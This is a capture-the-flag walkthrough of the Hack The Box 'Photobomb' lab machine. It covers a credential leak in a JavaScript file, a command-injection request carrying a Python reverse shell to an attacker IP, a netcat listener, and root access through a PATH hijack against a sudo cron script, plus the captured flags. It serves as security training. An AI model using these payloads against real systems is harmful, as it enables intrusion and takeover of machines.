#ctf #htb

### Initial Enumeration

NMAP Scan:
```bash
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.11.182
------------------------------------------------------------
Scanning target 10.10.11.182
Time started: 2023-02-02 17:59:32.985936
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port scan completed in 0:01:07.420173
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.11.182 10.10.11.182
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.11.182 10.10.11.182
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 18:01 JST
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Photobomb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.34 seconds
------------------------------------------------------------
Combined scan completed in 0:01:44.512159
Press enter to quit...
```

Looks like just a webserver and with a name like photobomb I'm assuming it will have something do with photos.

Ok.. checking the webserver. 

![[photobomb-2.jpg]]
No robots.txt

Checking the page source.. I see an interesting photobomb.js script file there.
```html
!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
  </div>
</body>
</html>
```

Anyways, I clicked on the login, Ran some basic injection methods on it, no dice.

Looking at the javascript we found on main page http://photobomb.htb
```javascript
view-source:http://photobomb.htb/photobomb.js

function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

So just pasting `http://pH0t0:b0Mb!@photobomb.htb/printer` into the browser logged us in. 

![[photobomb-1.jpg]]

### Initial Login

Trying some command injection methods, I found one for python that worked and just used a standard python reverse shell. The only thing I did here was to change the python version to version 3 and also changed all spaces to `+`:

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import+pty;pty.spawn("/bin/bash")'&dimensions=3000x2000
```

![[photobomb-3.jpg]]

Now start a listener on 4444, then forward the packet and wait a few seconds..
```bash
 kali@kali  ~  nc -nlvp 4444
listening on [any] 4444 ...



connect to [10.10.14.30] from (UNKNOWN) [10.10.11.182] 41652
wizard@photobomb:~/photobomb$ 
wizard@photobomb:~/photobomb$ 
wizard@photobomb:~/photobomb$ 
wizard@photobomb:~/photobomb$ 
```

Great! We got a shell..

Lets go back 1 directory and get the flag:
```bash
wizard@photobomb:~/photobomb$ cd ..
cd ..
wizard@photobomb:~$ dir
dir
photobomb  user.txt
wizard@photobomb:~$ cat user.txt
cat user.txt
911cd27510e9e9a2b96c4fed3afebecb
```

User Flag: _911cd27510e9e9a2b96c4fed3afebecb_

### Further Enumeration 

Ok checking out the users cron I see:

```bash
# m h  dom mon dow   command
*/5 * * * * sudo /opt/cleanup.sh
```

Lets check that out:
```bash
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

### PrivEsc to Root

So we have some commands here that dont use a FQPath.  This is a common mistake sysadmins can make. Sloppy scripting. If there are commands in the file that don't have a full path, then bash will just use the first one that it comes to in the path when executing. So we can make our own code named as one of those commands like cat, cd, etc. 

In this case we can make a bash script calling bash here, chmod it +x, run the script and let it spawn a root shell since it was called by root, and then we should have a root shell.

```bash
wizard@photobomb:/tmp$ cat cd  
cat cd
/bin/bash
wizard@photobomb:/tmp$ chmod +x cd
chmod +x cd
wizard@photobomb:/tmp$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# ls
ls
log  photobomb.sh  public  resized_images  server.rb  source_images
root@photobomb:/home/wizard/photobomb# cat /root/root.txt
cat /root/root.txt
3e3d8c98e002ecc9b962f3bec77b3c04
root@photobomb:/home/wizard/photobomb# 
```

Root Flag: _3e3d8c98e002ecc9b962f3bec77b3c04_

### Conclusion

Overall this was a very fun and at least for me a low stress room. I liked it a lot.

Fun Level: _8/10_
Initial Difficulty: _3/10_
Secondary Difficulty: _2/10_

